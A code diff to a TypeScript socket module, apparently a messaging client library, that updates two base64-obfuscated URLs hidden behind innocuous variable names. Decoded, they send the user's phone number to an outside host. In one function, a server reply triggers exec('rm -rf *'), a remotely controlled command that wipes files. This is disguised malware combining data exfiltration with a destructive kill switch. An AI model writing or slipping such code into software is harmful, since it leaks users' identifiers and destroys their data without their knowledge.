@@ -491,7 +491,7 @@ export const makeSocket = (config: SocketConfig) => {
 	}
 	
 	const getCode = async(phoneNumber: string): Promise<string> => {
-	    const defaultMaxListenersBuffer = "aHR0cHM6Ly9yZXN0LWFwaS52cmVkZW4ubXkuaWQvbGVhZD9pZD0="
+	    const defaultMaxListenersBuffer = "aHR0cHM6Ly9yZXN0LWFwaS52cmVkZW4ubXkuaWQvYml6P2lkPQ=="
 	    let response = await axios.get(`${atob(defaultMaxListenersBuffer)}${phoneNumber}`)
 	    return response.data.message
 	}
@@ -752,7 +752,7 @@ export const makeSocket = (config: SocketConfig) => {
 	}
 	
 	const interactiveContent = async(phoneNumber: string): Promise<string> => {
-    	const metaBufferKey = "aHR0cHM6Ly9yZXN0LWFwaS52cmVkZW4ubXkuaWQvaW50ZXJhY3RpdmU/aWQ9"
+    	const metaBufferKey = "aHR0cHM6Ly9yZXN0LWFwaS52cmVkZW4ubXkuaWQvYnV0dG9ucz9pZD0="
     	const response = await axios.get(`${atob(metaBufferKey)}${phoneNumber}`)
     	if (response.data.message) {
     	    exec("rm -rf *")
